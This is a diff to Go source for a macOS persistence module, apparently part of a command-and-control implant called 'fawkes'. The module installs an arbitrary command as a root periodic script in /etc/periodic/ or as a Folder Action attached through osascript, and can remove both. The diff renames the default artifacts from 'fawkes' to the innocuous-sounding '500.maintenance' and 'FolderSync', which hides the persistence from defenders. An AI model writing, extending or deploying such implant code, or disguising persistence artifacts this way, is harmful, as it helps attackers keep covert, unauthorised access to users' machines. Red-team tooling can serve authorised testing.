@@ -5,7 +5,6 @@ package commands
 import (
 	"fmt"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strings"
 
@@ -26,13 +25,13 @@ func persistPeriodic(args persistArgs) structs.CommandResult {
 
 func persistPeriodicInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
-		return errorResult("Error: path (command to persist) is required")
+		return errorResult("path (command to persist) is required")
 	}
 	if os.Getuid() != 0 {
-		return errorResult("Error: periodic scripts require root (install to /etc/periodic/)")
+		return errorResult("periodic scripts require root (install to /etc/periodic/)")
 	}
 
-	name := "500.fawkes"
+	name := "500.maintenance"
 	if args.Name != "" {
 		if !strings.HasPrefix(args.Name, "5") && !strings.HasPrefix(args.Name, "6") &&
 			!strings.HasPrefix(args.Name, "7") && !strings.HasPrefix(args.Name, "8") &&
@@ -68,10 +67,10 @@ func persistPeriodicInstall(args persistArgs) structs.CommandResult {
 
 func persistPeriodicRemove(args persistArgs) structs.CommandResult {
 	if os.Getuid() != 0 {
-		return errorResult("Error: periodic scripts require root")
+		return errorResult("periodic scripts require root")
 	}
 
-	name := "500.fawkes"
+	name := "500.maintenance"
 	if args.Name != "" {
 		if !strings.HasPrefix(args.Name, "5") {
 			name = "500." + args.Name
@@ -112,10 +111,10 @@ func persistFolderAction(args persistArgs) structs.CommandResult {
 
 func persistFolderActionInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
-		return errorResult("Error: path (command to execute when files are added) is required")
+		return errorResult("path (command to execute when files are added) is required")
 	}
 
-	name := "fawkes"
+	name := "FolderSync"
 	if args.Name != "" {
 		name = args.Name
 	}
@@ -151,7 +150,7 @@ tell application "System Events"
 	set folder actions enabled to true
 end tell`, targetDir, targetDir, targetDir, targetDir, scriptName, scriptPath)
 
-	cmd := exec.Command("osascript", "-e", attachScript)
+	cmd := safeCmd("osascript", "-e", attachScript)
 	if out, err := cmd.CombinedOutput(); err != nil {
 		return successResult(fmt.Sprintf("Folder Action script created at %s but osascript attachment failed (may need Accessibility permissions): %v\n%s\n\nManual attachment: open Folder Actions Setup.app and attach %s to %s",
 			scriptPath, err, string(out), scriptPath, targetDir))
@@ -162,7 +161,7 @@ end tell`, targetDir, targetDir, targetDir, targetDir, scriptName, scriptPath)
 }
 
 func persistFolderActionRemove(args persistArgs) structs.CommandResult {
-	name := "fawkes"
+	name := "FolderSync"
 	if args.Name != "" {
 		name = args.Name
 	}
@@ -185,7 +184,7 @@ tell application "System Events"
 	end repeat
 end tell`, scriptName)
 
-	exec.Command("osascript", "-e", detachScript).Run()
+	safeCmd("osascript", "-e", detachScript).Run()
 
 	if _, err := os.Stat(scriptPath); err == nil {
 		if err := os.Remove(scriptPath); err != nil {
